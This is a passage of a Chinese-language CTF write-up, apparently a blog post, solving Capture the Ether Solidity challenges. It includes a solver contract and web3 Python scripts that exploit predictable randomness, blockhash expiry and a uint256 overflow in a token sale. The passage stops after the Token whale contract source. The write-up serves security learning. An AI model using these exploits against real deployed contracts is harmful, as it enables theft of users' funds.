class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IGuessTheNewNumberChallenge &#123;</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberSolver &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(address _addr, uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">        </span><br><span class="line">        challenge.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle(address _addr, uint8 n ) public payable &#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if (answer &#x3D;&#x3D; n )&#123;</span><br><span class="line">            IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">            challenge.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-Predict-the-block-hash"><a href="#6-Predict-the-block-hash" class="headerlink" title="6.   Predict the block hash"></a>6.   Predict the block hash</h3><p><strong>题目描述：</strong></p><p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; hash;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer &#x3D; block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU">Get Lucky</a>.</p><p><strong>解题：</strong></p><p>根据黄皮书对 <code>BLOCKHASH </code> 的定义：只能获取最近 256 个区块的哈希，超出时返回 0</p><p>所以我们可以先猜 0 的 hash， 然后等他超过 256 个区块，再来开奖。 可以用 python3 web3直接实现利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;settle&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;hash&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bytes32&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;lockInGuess&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key) </span><br><span class="line"></span><br><span class="line">my_guess_hash = <span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line">print(w3.eth.getTransactionCount(acct.address))</span><br><span class="line"></span><br><span class="line">print(contract.all_functions())</span><br><span class="line"></span><br><span class="line">tx = contract.functions.lockInGuess(my_guess_hash).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:  Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&quot;gas&quot;</span>: <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gasPrice,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">            <span class="string">&quot;chainId&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line"></span><br><span class="line">print(w3.eth.wait_for_transaction_receipt(tx_id, timeout=  <span class="number">300</span> ))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1. Token sale"></a>1. Token sale</h3><p><strong>题目描述：</strong></p><p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p><p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tgIqecROs5M"><del>Sale</del> Sail</a>.</p><p><strong>解题：</strong></p><p><code>buy</code> 函数中的乘法存在溢出， 因此我们可以低买高卖 。 此处的msg.value是以ether为单位，因为一个PRICE_PRE_TOKEN就是1 ether，这里我们需要明白在以太坊里最小的单位是wei，所以此处的1 ether事实上也就是10^18 wei，即其值的大小为10^18 wei，这样就满足我们溢出的条件了，因为以太坊处理数据是以256位为单位，我们传入一个较大的numTokens，乘法运算溢出后所需的mag.value就非常小了， 直接利用 Python 脚本解决这个题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> timeout</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0x0e27e17Ab06db38134825299a2bA0A3749Ea810c&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;buy&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;sell&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key)</span><br><span class="line"></span><br><span class="line">min_token_number_with_overflow = <span class="number">2</span> ** <span class="number">256</span> // <span class="number">10</span> ** <span class="number">18</span> + <span class="number">1</span></span><br><span class="line">value = (min_token_number_with_overflow * <span class="number">10</span> ** <span class="number">18</span>) % <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[*] Buying ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">tx = contract.functions.buy(min_token_number_with_overflow).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> : value,</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;[+] Bought!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] Selling ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tx = contract.functions.sell(<span class="number">1</span>).buildTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    signed = acct.signTransaction(tx)</span><br><span class="line">    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line">    <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&quot;[+] Sold!&quot;</span>)</span><br><span class="line">        print(contract.functions.isComplete().call())</span><br><span class="line">        print(<span class="string">&#x27;[+] Solved&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2. Token whale"></a>2. Token whale</h3><p><strong>题目描述：</strong></p><p>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.</p><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">        totalSupply &#x3D; 1000;</span><br><span class="line">        balanceOf[player] &#x3D; 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;&#x3D; 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a 